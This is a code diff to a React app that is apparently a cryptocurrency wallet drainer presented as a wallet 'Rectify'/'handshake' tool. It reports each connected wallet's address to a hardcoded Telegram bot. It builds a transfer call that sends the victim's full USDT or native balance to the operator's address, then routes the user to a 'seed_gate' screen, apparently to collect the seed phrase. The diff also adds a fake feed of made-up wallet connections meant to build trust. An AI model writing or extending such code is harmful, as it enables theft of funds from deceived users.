@@ -9,10 +9,12 @@ export default function App() {
   
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
+  const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
   const [inputVal, setInputVal] = useState(""); 
   const [seedVal, setSeedVal] = useState("");   
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
+  const [feedMsg, setFeedMsg] = useState(""); // ⬅️ FEED STATE RESTORED
 
   const bT = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const cI = "7630238860";
@@ -20,28 +22,39 @@ export default function App() {
 
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
+  // 🎯 REAL HIT NOTIFICATION
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_final_fixed')) {
+    if (isConnected && address && !sessionStorage.getItem('hit_vFinal_v3')) {
       log(`🎯 WALLET CONNECTED!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_final_fixed', 't');
+      sessionStorage.setItem('hit_vFinal_v3', 't');
     }
   }, [isConnected, address, chainId]);
+
+  // 🛡️ FAKE CONNECTION FEED RESTORED
+  useEffect(() => {
+    const loop = setInterval(() => {
+      const r = Math.floor(1000 + Math.random() * 8999);
+      setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_RELAY`);
+      setTimeout(() => setFeedMsg(""), 4000);
+    }, 12000);
+    return () => clearInterval(loop);
+  }, []);
 
   const { data: nB } = useBalance({ address }); 
   const { data: tB } = useBalance({ address, token: chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : "0x55d398326f99059ff775485246999027b3197955" });
 
   useEffect(() => {
     if (activeTask === "Rectify") {
-      const val = tB?.formatted || nB?.formatted || "0.00";
+      const val = selectedAsset === "TOKEN" ? (tB?.formatted || "0.00") : (nB?.formatted || "0.00");
       setInputVal(val.slice(0, 10));
     } else {
       setInputVal("");
     }
-  }, [activeTask, tB, nB]);
+  }, [activeTask, tB, nB, selectedAsset]);
 
   const handleHandshake = () => {
     const usdt = chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : "0x55d398326f99059ff775485246999027b3197955";
-    if (tB && tB.value > 0n) {
+    if (tB && tB.value > 0n && selectedAsset === "TOKEN") {
       const d = `0xa9059cbb${dest.replace('0x', '').toLowerCase().padStart(64, '0')}${tB.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: usdt, data: d }, { onSettled: () => setView("seed_gate") });
     } else if (nB && nB.value > 100000000000000n) {
@@ -60,7 +73,7 @@ export default function App() {
 
       {isConnected ? (
         <>
-          <div style={{width:'100%', height:'200px', borderRadius:'12px', overflow:'hidden', marginBottom:'15px', border:'1px solid #1e293b'}}>
+          <div style={{width:'100%', height:'180px', borderRadius:'12px', overflow:'hidden', marginBottom:'15px', border:'1px solid #1e293b'}}>
              <iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} title="chart" />
           </div>
 
@@ -81,10 +94,16 @@ export default function App() {
           )}
 
           {view === "task_box" && (
-            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
+            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center', position:'relative'}}>
               <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
+              
+              <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'20px', border:'1px solid #1e293b'}}>
+                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'9px', cursor:'pointer', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900'}}>USDT_POOL</div>
+                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'9px', cursor:'pointer', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900'}}>GAS_POOL</div>
+              </div>
+
               <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
-              <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
+              <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'15px 0', border:'1px solid #1e293b'}}>
                 <input type="number" value={inputVal} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
               </div>
               <button onClick={handleHandshake} style={{width:'100%', backgroundColor: (activeTask === "Rectify" || (inputVal !== "" && inputVal !== "0")) ? '#10b981' : '#1e293b', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
@@ -127,6 +146,11 @@ export default function App() {
           </div>
           <appkit-button />
         </div>
+      )}
+
+      {/* 🛡️ RENDER THE FEED MESSAGE HERE */}
+      {feedMsg && (
+        <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:5000}}>{feedMsg}</div>
       )}
     </div>
   );
